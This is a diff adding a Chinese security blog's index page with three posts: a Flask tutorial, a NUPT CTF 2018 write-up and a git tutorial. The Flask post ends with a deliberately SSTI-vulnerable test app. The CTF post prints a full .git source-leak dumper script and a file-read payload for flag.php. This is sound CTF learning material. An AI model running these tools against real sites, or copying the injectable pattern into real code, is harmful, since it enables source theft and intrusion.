@@ -1,0 +1,2662 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/ava.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/ava.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="hack、share">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Sec-Communication">
+<meta property="og:url" content="http://yoursite.com/page/3/index.html">
+<meta property="og:site_name" content="Sec-Communication">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sec-Communication">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/page/3/">
+
+
+
+
+
+  <title>Sec-Communication</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-Communication</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/14/flask从0到无/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/14/flask从0到无/" itemprop="url">Flask从零到无</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-14T00:00:00+08:00">
+                2018-12-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="零基础学起"><a href="#零基础学起" class="headerlink" title="零基础学起"></a>零基础学起</h1><p>学习flask我选择了 pycharm，学生的话可以免费下载专业版。废话不多说了。  </p>
+<p>环境：python 3.6+<br>基础：0-<br>日期：2018.12.14 </p>
+<h1 id="flask入门"><a href="#flask入门" class="headerlink" title="flask入门"></a>flask入门</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>pycharm安装flask会自动导入了flask所需的模块，所以我们只需要命令安装所需要的包就可以了，建议用python3.6学习而不是2.7，毕竟django都快要不支持2.7了，早换早超生。</p>
+<p>自动导入的也是python 3.6。<br><img src="https://i.imgur.com/VgalqNv.png" alt></p>
+<p>运行这边会出小错，因为此时我们还没有安装flask包，</p>
+<p><img src="https://i.imgur.com/9C4jrbP.png" alt></p>
+<p>这样就可以正常运行了，运行成功便会返回 </p>
+<pre><code> * Debug mode: off
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET / HTTP/1.1&quot; 200 -
+127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</code></pre><p>此时可以在web上运行hello world了，访问<a href="http://127.0.0.1:5000。可以看到打印出Hello" target="_blank" rel="noopener">http://127.0.0.1:5000。可以看到打印出Hello</a> World</p>
+<h2 id="route装饰器路由"><a href="#route装饰器路由" class="headerlink" title="route装饰器路由"></a>route装饰器路由</h2><pre><code>@app.route(&apos;/&apos;)</code></pre><p>使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。 route() 装饰器把一个函数绑定到对应的 URL 上，这句话相当于路由，一个路由跟随一个函数，如</p>
+<pre><code>@app.route(&apos;/&apos;)
+def test()&quot;
+   return 123</code></pre><p>访问127.0.0.1:5000/ 则会输出123，我们修改一下规则</p>
+<pre><code>@app.route(&apos;/test&apos;)
+def test()&quot;
+   return 123</code></pre><p>这个时候访问127.0.0.1:5000/test 会输出123。<br>此外还可以设置动态url，</p>
+<pre><code>@app.route(&quot;/hello/&lt;username&gt;&quot;)
+def hello_user(username):
+  return &quot;user:%s&quot;%username</code></pre><p>根据url里的输入，动态辨别身份，此时便可以看到如下页面：</p>
+<p><img src="https://i.imgur.com/P2XIEeU.png" alt></p>
+<p>或者可以使用int型，转换器有下面几种：</p>
+<pre><code>int    接受整数
+float    同 int ，但是接受浮点数
+path    和默认的相似，但也接受斜线
+
+@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)
+def show_post(post_id):
+    # show the post with the given id, the id is an integer
+    return &apos;Post %d&apos; % post_id</code></pre><h2 id="main入口"><a href="#main入口" class="headerlink" title="main入口"></a>main入口</h2><p>当.py文件被直接运行时，if <strong>name</strong> == ‘<strong>main</strong>‘之下的代码块将被运行；当.py文件以模块形式被导入时，if <strong>name</strong> == ‘<strong>main</strong>‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if <strong>name ==’</strong>main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。    </p>
+<pre><code>if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><p>测试的时候，我们可以使用debug，方便调试，增加一句</p>
+<pre><code>app.debug = True
+或者（效果是一样的）
+app.run(debug=True)</code></pre><p>这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。</p>
+<pre><code>app.run(host=&apos;0.0.0.0&apos;)</code></pre><p>这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。</p>
+<h2 id="http请求方法"><a href="#http请求方法" class="headerlink" title="http请求方法"></a>http请求方法</h2><p>页面需要get请求或者post请求也可以由路由来解决，通过 route() 装饰器传递 methods 参数。如我们要在登录页面使用get或者post登录输入。</p>
+<pre><code>@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def login():
+    if request.method == &apos;POST&apos;:
+        do_the_login()
+    else:
+        show_the_login_form()</code></pre><h2 id="模版渲染"><a href="#模版渲染" class="headerlink" title="模版渲染"></a>模版渲染</h2><p>何为模版渲染  点击连接—&gt;&gt;&gt;  <a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p>
+<p>你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:</p>
+<p>简单的模版渲染示例</p>
+<pre><code>from flask import render_template
+
+@app.route(&apos;/hello/&apos;)
+@app.route(&apos;/hello/&lt;name&gt;&apos;)
+def hello(name=None):
+        return render_template(&apos;hello.html&apos;, name=name)</code></pre><h1 id="flask简单实例"><a href="#flask简单实例" class="headerlink" title="flask简单实例"></a>flask简单实例</h1><p>我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名，所以我们先从flask模版渲染入手深入剖析。</p>
+<p>首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p>
+<pre><code>├── app.py  
+├── static  
+│   └── style.css  
+└── templates  
+    └── index.html  </code></pre><p><img src="https://i.imgur.com/vWxXdEc.png" alt></p>
+<p>我们写一个index.html文件写templates文件夹中。</p>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
+  &lt;/head&gt;
+ &lt;body&gt;
+      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>里面有两个参数需要我们渲染，user.name，以及title</p>
+<p>我们在app.py文件里进行渲染。</p>
+<pre><code>@app.route(&apos;/&apos;)
+@app.route(&apos;/index&apos;)#我们访问/或者/index都会跳转
+def index():
+   user = {&apos;name&apos;: &apos;小猪佩奇&apos;}#传入一个字典数组
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=user)</code></pre><p><img src="https://i.imgur.com/RyvwVaU.png" alt></p>
+<p>这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。<br>jinja2模板同样支持控制语句，在｛% %｝中输入我们的代码。如</p>
+<pre><code>{% if title %}
+    <title>{{title}} - xzpq</title>
+    {% else %}
+    <title>Welcome to xzpq</title>
+    {% endif %}</code></pre><p>如果传入title参数那么执行</p>
+<pre><code>&lt;title&gt;{{title}} - xzpq&lt;/title&gt; </code></pre><p>否则执行</p>
+<pre><code>&lt;title&gt;Welcome to xzpq&lt;/title&gt; </code></pre><p>最后执行下面未写出。</p>
+<p>本文暂且到这里，主要是为了配合ssti模板注入而了解flask注入。看继续参考博文SSTI模板注入。</p>
+<p>测试的代码贴上</p>
+<pre><code>from flask import Flask
+from flask import render_template
+from flask import request
+from flask import render_template_string
+app = Flask(__name__)
+
+@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def login():
+    if request.method == &apos;POST&apos;:
+        do_the_login()
+    else:
+        show_the_login_form()
+
+@app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+@app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#我们访问/或者/index都会跳转
+def index():
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;))
+
+
+@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+def test():
+    template = &apos;&apos;&apos;
+        &lt;div class=&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+            &lt;h3&gt;%s&lt;/h3&gt;
+        &lt;/div&gt; 
+    &apos;&apos;&apos; %(request.url)
+    return render_template_string(template)
+
+
+if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><hr>
+<p>参考：<a href="http://www.pythondoc.com/flask-mega-tutorial/" target="_blank" rel="noopener">http://www.pythondoc.com/flask-mega-tutorial/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/06/南邮CTF-2018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/06/南邮CTF-2018/" itemprop="url">南邮CTF-2018</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-06T00:00:00+08:00">
+                2018-12-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h1><p>进入网站是一个时钟。<br><img src="https://i.imgur.com/0Pw6skq.png" alt><br>并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示</p>
+<p>Allsource files areingit tag1.0</p>
+<p>这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版本必须要回溯到1.0版本。不过既然有.git按道理说都是可以看到的。一个工具给大家。</p>
+<pre><code>#!/bin/bash
+#
+# Author: Denny Huang &lt;denny0223@gmail.com&gt;
+# Wed Sep 17 2014
+# MIT License
+function downloadBlob {
+    echo downloadBlob $1
+    mkdir -p ${1:0:2}
+    cd $_
+
+    wget -q -nc $domain/.git/objects/${1:0:2}/${1:2}
+
+    cd ..
+}
+
+function parseTree {
+    echo parseTree $1
+
+    downloadBlob $1
+
+    while read line
+    do
+        type=$(echo $line | awk &apos;{print $2}&apos;)
+        hash=$(echo $line | awk &apos;{print $3}&apos;)
+
+        [ &quot;$type&quot; = &quot;tree&quot; ] &amp;&amp; parseTree $hash || downloadBlob $hash
+    done &lt; &lt;(git cat-file -p $1)
+}
+
+function parseCommit {
+    echo parseCommit $1
+
+    downloadBlob $1
+
+    tree=$(git cat-file -p $1| sed -n &apos;1p&apos; | awk &apos;{print $2}&apos;)
+    parseTree $tree
+
+    parent=$(git cat-file -p $1 | sed -n &apos;2p&apos; | awk &apos;{print $2}&apos;)
+
+    [ ${#parent} -eq 40 ] &amp;&amp; parseCommit $parent
+}
+
+[ -z $1 ] &amp;&amp; echo -e &quot;missing target url\n\n\
+Usage: scrabble &lt;url&gt;\n\
+Example: scrabble http://example.com/\n\n\
+You need make sure target url had .git folder&quot;\
+&amp;&amp; exit
+
+domain=$1
+ref=$(curl -s $domain/.git/HEAD | awk &apos;{print $2}&apos;)
+
+lastHash=$(curl -s $domain/.git/$ref)
+
+git init
+
+cd .git/objects/
+
+parseCommit $lastHash
+
+cd ../../
+
+echo $lastHash &gt; .git/refs/heads/master
+
+git reset --hard</code></pre><p>用法如图<br>注意 scrabble 是我上面脚本的名字。无需后缀，要在linux bash运行<br><img src="https://i.imgur.com/DN5IB6S.png" alt></p>
+<p>之后便可以当作自己的git仓库来使用。如 git log</p>
+<p><img src="https://i.imgur.com/xJhVeKY.png" alt></p>
+<p>上面是我本地测试自己的代码。我们回归正题。因为题目已经关了，没法复现题目中的git,意思就是git log，查看到各个版本的版本号，然后 </p>
+<p>git show HEAD 版本号查看进行了什么修改增加便可以看到flag。</p>
+<p>root@xiaozhupeiqi:/scrabble# git show HEAD cf36b7a28707d581e4c5be4a2061ad41c9d386e2</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11900959-7ad0cc3749de9cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/457" alt></p>
+<h1 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h1><p><img src="https://i.imgur.com/ZI77p9c.png" alt></p>
+<p>前言：比赛结束后测试的，自我认为是环境问题，使用别人的poc也跑不出来flag，就当自己练习脚本了。</p>
+<p>先贴出脚本自写（未验证准确性）</p>
+<pre><code>import requests
+import re
+import time
+url=&apos;http://127.0.0.1/2/index.php&apos;
+s=requests.Session()
+r=s.get(url)
+while(1):
+    a = r.content[1600:4250].decode(encoding=&apos;utf-8&apos;)
+    matchp = re.findall(r&apos;[0-9\+\-\*]&apos;,a)
+    a=&quot;&quot;
+    for i in matchp:
+        a=a+i
+    b=&quot;&quot;
+    map=re.findall(r&apos;[1-9]+[0]*[1-9]+[0]*[1-9]+[0]*[1-9]+[\+\-\*]*&apos;,a)
+    for i in map:
+        b=b+i
+    b=&apos;9223372036854775807+&apos;+b
+    print b
+    print eval(b)
+
+    c=eval(b)
+
+    payload={&apos;input&apos;:&apos;1111111111111111111111&apos;,&apos;ans&apos;:c}
+    r=s.post(url,data=payload)
+    time.sleep(1.5)
+    print r.content.decode(encoding=&apos;utf-8&apos;)</code></pre><p>分析：<br>此题中一看场面应该是自写脚本然后计算结果快速提交。但是肯定会有考其他的知识点。以后看到ctf先扫一波，扫到源码</p>
+<p>源码中有一很重要的知识点<br>知识点 1</p>
+<pre><code>if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;]){</code></pre><p>intval 是防止程序溢出的函数，32位系统溢出最大：2147483647 64位系统溢出最大：9223372036854775807，检测为64位系统，所以你提交22位的数字会自动转化为 9223372036854775807，所以脚本计算的时候要使用 9223372036854775807 而不是22位自己input的数字。</p>
+<p>知识点2 </p>
+<pre><code>if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1){
+            session_destroy();
+            echo &apos;
+            &lt;script language=&quot;javascript&quot;&gt;  
+            alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  
+            window.history.back(-1); &lt;/script&gt; &apos;;
+        }</code></pre><p>源码中指定不能提交速度太快，在github上下载的所有源码规定的是如果你提交五次正确答案就给你flag，但是你不能提交太快，我们使用函数<br>time.sleep(1.5)，定义1.5S 提交一次。</p>
+<p>知识点3 </p>
+<p>正则，我是没写过几次正则的，所以写的很辣鸡，是真的辣鸡，匹配有点鸡肋，说不清自己体会把。。</p>
+<p>知识点4</p>
+<p>必须要做一个session，因为需要一个用户提交五次及以上。</p>
+<p>知识点5</p>
+<p>findall函数要学清楚，细心！就完事。</p>
+<p>脚本运行截图</p>
+<p><img src="https://i.imgur.com/rO6sIC8.png" alt><br>不要问我为什么没算对，应该是直接下载源码环境不对，算是肯定算对了的，网上下载的poc也同样没跑出来flag，应该是环境嗯，环境问题。</p>
+<h1 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h1><p>进去之后发现网站跳转302，抓包，看到最下面，（我发现CTF不细心的人做不出来还会原地爆炸）<br><img src="https://i.imgur.com/BEAt4p8.png" alt></p>
+<!-- post me viewsource -->
+<p>post 一个 viewsource参数就好看到源码</p>
+<p><img src="https://i.imgur.com/wH9nOh1.png" alt></p>
+<pre><code>if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;]))){
+    header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);
+}else{
+    echo &apos;great&apos;;
+}</code></pre><p>这玩意是**骗人的，不用绕我日！<br>自己体会。利用最后一句源码 就是读取文件就完事</p>
+<pre><code>echo file_get_contents(de_code($_GET[&apos;file_&apos;]));</code></pre><p>将function逆向编写，然后顺理成章的下面就会读取文件。flag.php就在当前文件下，直接读就行了</p>
+<p>逆向代码</p>
+<pre><code>for($i=0;$i&lt;strlen($value);$i++){
+        $result .= chr(ord($value[$i])+$i*2);
+    }
+    $result=base64_encode($result);
+    echo $result;</code></pre><p>value输入想读的文件输入flag.php 转换成Zm5lbTZ6dH4=<br>然后提交file_=Zm5lbTZ6dH4=就可读取flag.php<br>千万不要被骗了，哭了！<br><img src="https://i.imgur.com/L3m1MHA.png" alt></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/04/git工具的使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/04/git工具的使用/" itemprop="url">git使用与部署github</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-04T00:00:00+08:00">
+                2018-12-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="GIT是什么"><a href="#GIT是什么" class="headerlink" title="GIT是什么"></a>GIT是什么</h1><p>GIT是先进的分布式版本控制系统，既然是分布式控制系统，那么就是没有中央服务器的，每个终端都可以是一个完整的库，如果家庭单位两台电脑如何修改库呢，只需要推送给对方进行修改即可。既然是分布式，每台电脑就可以是一个库那么也就自然不需要连接服务器进行上传了，不过接下来我们要介绍到上传github上。</p>
+<h1 id="git有什么好处"><a href="#git有什么好处" class="headerlink" title="git有什么好处"></a>git有什么好处</h1><p>git最大的好处就是方便，好吧，如何方便呢，他可以自由回退各个版本，就是你对一个库的任何修改他都会保存，如果你用不到那么可以不用知道他的存在，如果你需要，他可以调用出来你以前的版本。举个例子。</p>
+<p>一个版本库存放一个项目，并且已经推送到github上供人下载，此时你要更新到下一个版本，进行修改推送到网站上，但是你发现有一个大bug，但是时间太久记不清修改了哪里，毕竟那么多细节，此时就可以用git按照日期回退版本，在进行从新开发。对任意时间段的版本重置。并且你可以对每次改动增加一个备注，比如：</p>
+<pre><code>版本    文件名      操作人   说明             日期
+1       test.txt   guest   增加项目1        2018.1.1
+2       test.txt   admin   删除第五行       2018.2.1
+2       test.txt   admin   修改管理员密码    2018.2.1</code></pre><p>这样可以极大方便开发人员操作人员的修改推送。</p>
+<h1 id="windows下gitbash"><a href="#windows下gitbash" class="headerlink" title="windows下gitbash"></a>windows下gitbash</h1><p>在windows下安装git工具，下载安装网上教程自寻。</p>
+<p>然后打开gitbash，一个git命令行，一些linux命令 windows命令可以使用，自己体会下。</p>
+<p>一切的操作都基于git bash操作，接下来我们详解git命令。</p>
+<h1 id="git命令学习"><a href="#git命令学习" class="headerlink" title="git命令学习"></a>git命令学习</h1><p>git init //把这个目录变成git可以管理的仓库<br><img src="https://i.imgur.com/Bdyf3dH.png" alt><br>.git目录是Git来跟踪管理版本的，不要轻易改动。<br>2.创建文件夹 mkdir test<br>  创建文件 touch 1.txt</p>
+<p><img src="https://i.imgur.com/WveLFit.png" alt><br>3.传送到我们的仓库</p>
+<p>git add 1.txt //将1.txt添加到暂存区。<br>如果想要将本文件夹全部添加到暂存区那么可以 git add .</p>
+<p>git commit告诉Git 添加到仓库<br>git commit -m ‘pqtest’//把文件提交到仓库，pqtest为本次修改的备注，通常用来备注复了某某bug等   </p>
+<p>还有一步推送出去，下面文章的github会讲到。<br>4.status查看当前状态<br>git status //查看状态是否有文件未提交<br><img src="https://i.imgur.com/GCr4PwH.png" alt></p>
+<p>git bash支持许多linux命令，自带vi我们vi 1.txt修改 增加几个1111<br>git diff 1.txt即可看到增加删减的东西。<br>或者 git diff即可看到所有有变动的更改。<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/cJBSZ88MaJLhkCtaVTf9c6ai8KQGDREIrJVhzhOyT.E!/b/dFIBAAAAAAAA&ek=1&kp=1&pt=0&bo=kARRAQAAAAADF*Y!&tl=1&vuin=275640346&tm=1543928400&sce=60-2-2&rf=viewer_4" alt></p>
+<p>5.查看更改日志</p>
+<p>git log 查看更改日志。<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/wKOeGuA3zT0pUoGygPgg.gPJwTiCS59LQB5sxdjp6Bw!/b/dLYAAAAAAAAA&ek=1&kp=1&pt=0&bo=8wQjAgAAAAADF.Q!&tl=1&vuin=275640346&tm=1543932000&sce=60-2-2&rf=viewer_4" alt><br>6.版本回退</p>
+<p>git reset –hard HEAD^ //版本回退到上一个版本。<br>回退之后 git log也相应地删除。</p>
+<p>git reflog 来查看历史操作，我们可以看到回退的版本。可以再次回退到之前的版本。</p>
+<p>git reset –hard 96ddb1f</p>
